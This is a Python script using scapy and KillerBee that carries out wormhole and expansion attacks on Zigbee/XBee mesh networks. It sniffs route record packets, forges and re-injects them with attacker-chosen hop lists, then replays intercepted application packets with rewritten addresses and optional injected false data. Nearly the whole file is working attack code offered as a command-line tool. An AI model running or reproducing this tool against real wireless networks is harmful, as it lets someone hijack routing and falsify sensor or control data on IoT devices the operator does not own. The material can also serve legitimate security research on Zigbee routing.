#!/usr/bin/python

import argparse
import random
import sys
import time
import logging
logging.getLogger("scapy.runtime").setLevel(logging.ERROR)
from scapy.all import (Dot15d4,
                       ZigbeeNWK,
                       ZigbeeNWKCommandPayload,
                       Dot15d4Data,
                       wrpcap,
                       rdpcap)
from killerbee import scapy_extensions as zbattacker


class rrprocessing(object):
    """ Inicializacion de variables en la clase, donde:
        zbpkt       = Paquete capturado.
        real_src    = direccion de origen.
    """


    def __init__(self, zbpkt, real_src, real_dst, save_capture, ope_chann):
        self.zbpkt = zbpkt
        self.l2coincidence = False
        self.opchannel = ope_chann
        self.real_src = int(real_src, 16)
        self.real_dst = int(real_dst, 16)
        self.savepcap = save_capture
        if self.savepcap:
            wrpcap("before_injection_pcap.pcap", self.zbpkt)
        # Diseccion del paquete segun los datos de interes:
        if zbpkt["ZigbeeNWKCommandPayload"].cmd_identifier == 5:
            self.ident = zbpkt["ZigbeeNWKCommandPayload"].cmd_identifier
            self.hops = zbpkt["ZigbeeNWKCommandPayload"].rr_relay_count
            self.addrs = zbpkt["ZigbeeNWKCommandPayload"].rr_relay_list

            self.zbaddr_src = zbpkt["ZigbeeNWK"].source
            self.zbaddr_dst = zbpkt["ZigbeeNWK"].destination
            self.addr_src_ext = zbpkt["ZigbeeNWK"].ext_src
            self.zbseqnum = zbpkt["ZigbeeNWK"].seqnum

            self.addr_src = zbpkt["Dot15d4Data"].src_addr
            self.addr_dst = zbpkt["Dot15d4Data"].dest_addr
            self.panid = zbpkt["Dot15d4Data"].dest_panid

            self.dseqnum = zbpkt["Dot15d4"].seqnum

            print(real_src, hex(self.zbaddr_src), real_dst, hex(self.zbaddr_dst))
            if self.real_src == self.zbaddr_src and self.real_dst == self.zbaddr_dst:
                self.l2coincidence = True



    def enumerate_route_fields(self):

        killerbee_cmd_reference = {
            1: "route request",
            2: "route reply",
            3: "network status",
            4: "leave",
            5: "route record",
            6: "rejoin request",
            7: "rejoin response",
            8: "link status",
            9: "network report",
            10: "network update"
        }

        if killerbee_cmd_reference[self.ident] == "route record":
            route_record_dict = {
                'id': killerbee_cmd_reference[self.ident],
                'source_addr': self.zbaddr_src,
                'source_addr_long': hex(self.addr_src_ext),
                'options': 0x00,
                'hop_count': self.hops,
                'addresses': self.addrs
                }

            print("[OK]Sequence Number: {:d}".format(self.zbseqnum))
            print "[OK]Route record parameters:"
            for rr_field, rr_value in route_record_dict.items():
                print "\t %s: %s" % (rr_field, rr_value)
        else:
            raise ValueError("[!!]Route record was not received.")


    def route_record_injection(self, hop_count=0, hop_list=[]):

        # if self.zbseqnum < 255:
        #     self.zbpkt["ZigbeeNWK"].seqnum += 1
        # else:
        #     self.zbpkt["ZigbeeNWK"].seqnum = 0

        # if self.dseqnum < 255:
        #     self.zbpkt["Dot15d4"].seqnum += 1
        # else:
        #     self.zbpkt["Dot15d4"].seqnum = 0
        self.zbpkt["ZigbeeNWK"].seqnum = random.randint(1, 255)
        self.zbpkt["Dot15d4"].seqnum = random.randint(1, 255)

        self.zbpkt["Dot15d4Data"].dest_addr = self.zbaddr_dst
        self.zbpkt["Dot15d4Data"].src_addr = self.zbaddr_src
        self.zbpkt["ZigbeeNWKCommandPayload"].rr_relay_count = hop_count
        self.zbpkt["ZigbeeNWKCommandPayload"].rr_relay_list = hop_list

        zbattacker.kbsendp(pkt=self.zbpkt, channel=self.opchannel, verbose=0)

        if self.savepcap:
            wrpcap("after_injection_pcap.pcap", self.zbpkt)
        return True


    def wormhole_replay(self, data_false):

        data_pkt = zbattacker.kbsniff(channel=self.opchannel,
                                      count=1,
                                      verbose=0,
                                      lfilter=pkt_filter('data'))

        dest = data_pkt[0]['ZigbeeNWK'].destination
        src = data_pkt[0]['ZigbeeNWK'].source

        if dest == self.zbaddr_src and src == self.zbaddr_dst:

            data_cap = data_pkt[0]
            data_cap['Dot15d4Data'].src_addr = self.zbaddr_dst
            data_cap['Dot15d4Data'].dest_addr = self.zbaddr_src

            #data_cap = seqnum_calc(data_cap)
            data_cap["Dot15d4"].seqnum = random.randint(1, 255)
            data_cap["ZigbeeNWK"].seqnum = random.randint(1, 255)

            if data_false is not None:
                frame_bytes = str(data_cap)
                frame_len = len(frame_bytes)-22
                frame_bytes = frame_bytes[0:frame_len]+data_false
                new_frame = Dot15d4(frame_bytes)

            zbattacker.kbsendp(pkt=new_frame,
                               channel=self.opchannel,
                               verbose=0,
                               count=1)
            print("[->]False data injected")
            return True
        else:
            return False


def route_record_processing(rr_object_pkt, hops, addrs):

    if rr_object_pkt.l2coincidence:
        print("[OK]Route record found for src %s:" % (rr_object_pkt.zbaddr_dst))
        rr_object_pkt.enumerate_route_fields()
        print("[**]Inyecting route record to %x" % rr_object_pkt.zbaddr_dst)
        rr_object_pkt.route_record_injection(hop_count=hops,
                                             hop_list=addrs)
        print "[->]Fake route injected!"

        return


def seqnum_calc(pkt_mod):

    if pkt_mod['ZigbeeNWK'].seqnum < 255:
        pkt_mod['ZigbeeNWK'].seqnum += 1
    elif pkt_mod['ZigbeeNWK'].seqnum == 255:
        pkt_mod['ZigbeeNWK'].seqnum = 0

    if pkt_mod['Dot15d4Data'].seqnum < 255:
        pkt_mod['Dot15d4Data'].seqnum += 1
    elif pkt_mod['Dot15d4Data'].seqnum == 255:
        pkt_mod['Dot15d4Data'].seqnum = 0

    return pkt_mod


def pkt_filter(layer_filter):
    if layer_filter == 'routing':
        return lambda rpacket: rpacket.haslayer("ZigbeeNWK"
                                                "Command"
                                                "Payload")\
                                                and rpacket.cmd_identifier == 5
    elif layer_filter == 'data':
        return lambda rpacket: rpacket.haslayer("ZigbeeNWK")\
                                                and len(rpacket.relays) > 0
    else:
        raise ValueError('IvalidFilter')


def main():

    command_line_args = argparse.ArgumentParser(description="Execute wormhole"
                                                            " or expansion"
                                                            " attack over Xbee"
                                                            " devices")
    cli_group = command_line_args.add_mutually_exclusive_group()
    command_line_args.add_argument("source_address",
                                   type=str,
                                   help="Route replay source address")
    command_line_args.add_argument("destination_address",
                                   type=str,
                                   help="Route replay destination address")
    command_line_args.add_argument("operational_channel",
                                   type=int,
                                   help="Network operation channel")
    command_line_args.add_argument("-s",
                                   "--save_pcap",
                                   action="store_true",
                                   default=False,
                                   help="Save attack *.pcap file")
    command_line_args.add_argument("-f", "--false_data",
                                   type=str,
                                   default=None,
                                   help="Override legitimate data packets")
    cli_group.add_argument("-w", "--wormhole",
                           action="store_true",
                           default=False,
                           help="Execute a wormhole attack")
    cli_group.add_argument("-e", "--expansion",
                           action="store_true",
                           default=False,
                           help="Execute an expansion attack")

    input_args = command_line_args.parse_args()
    src_address = input_args.source_address
    dst_address = input_args.destination_address
    ope_channel = input_args.operational_channel
    fake_data = input_args.false_data
    save_pcap = input_args.save_pcap

    if input_args.wormhole:
        mod_hops = 0
        mod_addr = []
        print("[OK]Executing wormhole attack on"
              " source {:s} and destination {:s}".format(src_address,
                                                         dst_address))
    elif input_args.expansion:
        mod_hops = int(raw_input("[**]Enter number of hops:"))
        addrs_list = raw_input("[**]Enter coma separated hops(Example=A,B,C):")
        addrs_list = addrs_list.split(",")
        mod_addr = []
        for addrs in addrs_list:
            addrs = int(addrs.strip(), 16)
            mod_addr.append(addrs)
        if len(mod_addr) < 1:
            print "[!!] No relay list was given.. closing."
            sys.exit(0)
    else:
        raise ValueError("ERROR: AttackTypeNotDefined")

    while True:

        print "[**]Sniffing and searching for source routing..."

        zbpacket = zbattacker.kbsniff(channel=ope_channel,
                                      lfilter=pkt_filter('routing'),
                                      count=1,
                                      verbose=0)

        route_record = rrprocessing(zbpacket[0],
                                    src_address,
                                    dst_address,
                                    save_pcap,
                                    ope_channel)
        route_record_processing(route_record, mod_hops, mod_addr)

        while True:
            print "[**]Sniffing for application data..."
            data_injection = route_record.wormhole_replay(fake_data)

            if data_injection:
                #if route_record.zbseqnum < 255:
                #    route_record.zbseqnum += 2
                #else:
                #    route_record.zbseqnum = 0
                route_record.zbseqnum = random.randint(1, 255)
                route_record_processing(route_record, mod_hops, mod_addr)


if __name__ == '__main__':
    main()
